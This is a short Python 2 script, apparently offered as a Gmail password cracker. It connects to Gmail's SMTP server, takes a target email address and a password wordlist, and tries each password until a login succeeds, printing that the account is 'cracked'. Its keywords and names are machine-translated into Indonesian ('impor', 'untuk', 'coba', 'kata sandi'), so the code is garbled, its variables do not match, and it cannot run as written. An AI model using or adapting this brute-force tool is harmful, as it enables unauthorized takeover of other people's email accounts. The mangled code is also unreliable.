impor smtplib

smtpserver = smtplib.SMTP ( " smtp.gmail.com " , 587 )
smtpserver.ehlo ()
smtpserver.starttls ()

user =  raw_input ( " Silakan masukkan alamat email: " )
passwfile =  raw_input ( " Masukkan daftar kata sandi: " )
passwfile =  terbuka (passwfile, " r " )

untuk sandi di passwfile:
        coba :
                smtpserver.login (pengguna, kata sandi)

                cetak  " [+] Akun Retak: % s "  % kata sandi
                istirahat ;
        kecuali smtplib.SMTPAuthenticationError:
                print  " [!] Kata Sandi Salah :(: % s "  % kata sandi